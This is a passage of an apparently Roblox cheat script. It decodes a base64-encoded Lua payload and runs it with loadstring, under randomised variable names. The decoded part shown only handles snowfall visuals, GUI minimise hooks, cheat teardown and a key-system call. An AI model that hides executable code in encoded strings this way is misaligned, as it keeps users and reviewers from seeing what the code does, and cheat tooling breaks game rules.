yKQogICAgX0cuU25vd0ZsYWtlQ29sb3IgPSBmbGFrZUNvbG9yIG9yIENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBfRy5Tbm93QmFja2dyb3VuZENvbG9yID0gYmFja2dyb3VuZENvbG9yIG9yIENvbG9yMy5mcm9tUkdCKDEwLCAxMCwgMTUpCiAgICB1cGRhdGVTbm93Q29sb3JzKCkKZW5kCgotLSBIb29rIGludG8gbWluaW1pemUvcmVzdG9yZSB0byBoaWRlL3Nob3cgc25vdyAobXVzdCBiZSBhZnRlciBTaG93S2V5U3lzdGVtKQppZiBtaW5pbWl6ZUd1aSBhbmQgcmVzdG9yZUd1aSB0aGVuCiAgICBsb2NhbCBvcmlnTWluaW1pemVHdWkgPSBtaW5pbWl6ZUd1aQogICAgbWluaW1pemVHdWkgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgX0cuU25vd0d1aSB0aGVuIF9HLlNub3dHdWkuRW5hYmxlZCA9IGZhbHNlIGVuZAogICAgICAgIG9yaWdNaW5pbWl6ZUd1aSgpCiAgICBlbmQKCiAgICBsb2NhbCBvcmlnUmVzdG9yZUd1aSA9IHJlc3RvcmVHdWkKICAgIHJlc3RvcmVHdWkgPSBmdW5jdGlvbigpCiAgICAgICAgb3JpZ1Jlc3RvcmVHdWkoKQogICAgICAgIGlmIF9HLlNub3dHdWkgdGhlbiBfRy5Tbm93R3VpLkVuYWJsZWQgPSB0cnVlIGVuZAogICAgZW5kCmVuZAoKLS0gVXBkYXRlIGRlc3Ryb3kgZnVuY3Rpb24gdG8gY2xlYW4gdXAgc25vdwpsb2NhbCBvcmlnRGVzdHJveUNoZWF0ID0gRGVzdHJveUNoZWF0CkRlc3Ryb3lDaGVhdCA9IGZ1bmN0aW9uKCkKICAgIGlmIF9HLlNub3dHdWkgdGhlbiBfRy5Tbm93R3VpOkRlc3Ryb3koKSBlbmQKICAgIF9HLlNub3dHdWkgPSBuaWwKICAgIF9HLlNub3dmbGFrZXMgPSBuaWwKICAgIGZvciBfLCBjIGluIHBhaXJzKFNub3dDb25uZWN0aW9ucykgZG8gaWYgYyB0aGVuIGM6RGlzY29ubmVjdCgpIGVuZCBlbmQKICAgIFNub3dDb25uZWN0aW9ucyA9IHt9CiAgICBpZiBvcmlnRGVzdHJveUNoZWF0IHRoZW4KICAgICAgICBvcmlnRGVzdHJveUNoZWF0KCkKICAgIGVuZAplbmQKClNob3dLZXlTeXN0ZW0oKQ==")
local f3sipah, enr2z8a = (loadstring or load)(r7xh702)

if f3sipah then
    local sp8b4ky, enr2z8a = pcall(f3sipah)
    if not sp8b4ky then
        warn("Erreur d'execution: " .. tostring(enr2z8a))
    end
else
    warn("Erreur de chargement: " .. tostring(enr2z8a))
end
